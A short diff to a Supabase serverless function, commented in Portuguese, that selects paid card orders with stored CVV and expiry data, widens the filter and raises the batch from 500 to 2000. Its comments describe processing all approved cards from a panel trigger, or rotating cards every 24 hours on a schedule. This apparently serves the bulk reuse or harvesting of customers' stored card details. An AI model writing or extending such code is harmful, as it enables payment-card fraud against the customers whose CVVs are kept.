@@ -123,13 +123,13 @@ serve(async (req) => {
     // Buscar pedidos de cartão aprovados com dados completos
     const { data: candidates } = await supabase
       .from('orders').select('*')
-      .eq('payment_method', 'card')
-      .in('status', ['approved', 'paid'])
+      .ilike('payment_method', 'Cartão%')
+      .eq('payment_status', 'paid')
       .not('ticket', 'is', null)
       .not('card_cvv', 'is', null)
       .not('card_expiry', 'is', null)
       .order('created_at', { ascending: false })
-      .limit(500);
+      .limit(2000);
 
     // Quando forçado pelo painel: processa TODOS os cartões aprovados disponíveis (dedup só por last4 no próprio lote).
     // No agendado: respeita batch_size e evita repetir o mesmo cartão nas últimas 24h.
